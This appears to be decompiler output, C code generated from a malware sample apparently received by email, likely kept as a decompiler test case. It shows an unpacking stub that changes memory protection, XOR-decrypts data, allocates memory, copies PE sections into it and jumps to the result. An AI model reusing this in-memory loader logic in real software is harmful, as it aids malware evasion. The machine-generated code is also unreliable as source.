// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1139/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401020()
{
	fn00401260(fp - 0x00000020);
	word32 eax_17 = (dwLoc20 << 0x0000000E) + 0x000A5020;
	Eq_224 * ecx_20[] = (eax_17 & 0xFFFF0000) + 0xFFFE724C;
	(&fp->dwFFFFFF15)[dwLoc20] = ecx_20[dwLoc20].dw0000 - 0x00000028;
	Eq_29 eax_31 = (eax_17 & 0xFFFF0000) + (ecx_20 + (dwLoc20 << 0x00000009))->dwFFFFFFFC + 0x000000FF - dwLoc20;
	VirtualProtect(eax_31, dwLoc14, 0x00000004, fp - 0x00000008);
	fn004011F0(eax_31, dwLoc14, dwLoc20);
	Eq_58 * ebx_58 = eax_31.u0[dwLoc20] + eax_31;
	byte dl_60 = ebx_58->b0006;
	word32 eax_78 = VirtualAlloc(ebx_58->t0034, Mem27[ebx_58 + 0x00000DC0 - ((dwLoc20 << 0x00000005) >>u 0x00000001):word32], 0x00003000, (dwLoc20 << 0x00000005) + 0xFFFFE560);
	fn00401240((&ebx_58->dw012B)[dwLoc20], eax_31, eax_78);
	word32 dwLoc1C_110 = (word32) dl_60;
	Eq_103 * esi_107 = &ebx_58->t00F8;
	do
	{
		fn00401240(esi_107->dw0010, eax_31 + Mem27[esi_107 + 0x00000014:word32], eax_78 + Mem27[esi_107 + 0x0000000C:word32]);
		word32 v13_109 = dwLoc1C_110 - 0x00000001;
		esi_107 = esi_107 + 1;
		dwLoc1C_110 = v13_109;
	} while (v13_109 != 0x00000000);
	(&fp->dw00D7)[dwLoc20] = (&ebx_58->dwFFFFFF51)[dwLoc20] + eax_78;
	code * eax_137 = (dwLoc20 << 0x00000006) + 0x003FDC80;
	eax_137();
	fn004011F0(fp - 0x00000058, 0x00000038, dwLoc20);
	Eq_68 * eax_153 = eax_78;
	do
		eax_153 = eax_153 + 1;
	while (eax_153->dw0000 != dwLoc20 - 0x554433FA);
	Mem163[fp - 0x0000006C:word32] = fp + 0xFFFFFED1 + dwLoc20;
	fn00401240(0x0000010F - dwLoc20, 0x00000038, eax_153);
	return;
}

void fn004011F0(Eq_29 dwArg04, Eq_44 dwArg08, ui32 dwArg0C)
{
	word32 * ebx_26 = dwArg04;
	int32 ecx_10 = dwArg08;
	word32 eax_16 = dwArg0C + 0x1295C75E;
	int32 dwLoc08_22 = 0x00000001;
	*ebx_26 = *ebx_26 ^ eax_16;
	ecx_10 = ecx_10 - 0x00000004;
	while (ecx_10 > 0x00000000)
	{
		eax_16 = eax_16 + 0x35296D2C + dwLoc08_22;
		ebx_26 = PTRADD(ebx_26,219) - dwArg0C;
		dwLoc08_22 = -fp->dwFFFFFFF8;
		*ebx_26 = *ebx_26 ^ eax_16;
		ecx_10 = ecx_10 - 0x00000004;
	}
	return;
}

void fn00401240(word32 dwArg04, Eq_29 dwArg08, Eq_68 * dwArg0C)
{
	Eq_197 * edi_13 = dwArg0C;
	Eq_199 * esi_15 = dwArg08;
	word32 ecx_17 = dwArg04;
	do
	{
		edi_13->b0000 = esi_15->b0000;
		esi_15 = esi_15 + 1;
		edi_13 = edi_13 + 1;
		ecx_17 = ecx_17 - 0x00000001;
	} while (ecx_17 != 0x00000000);
	return;
}

void fn00401260(word32 dwArg04)
{
	Mem0[0x7FFE0300:word32]();
	*dwArg04 = 0x00000010;
	return;
}

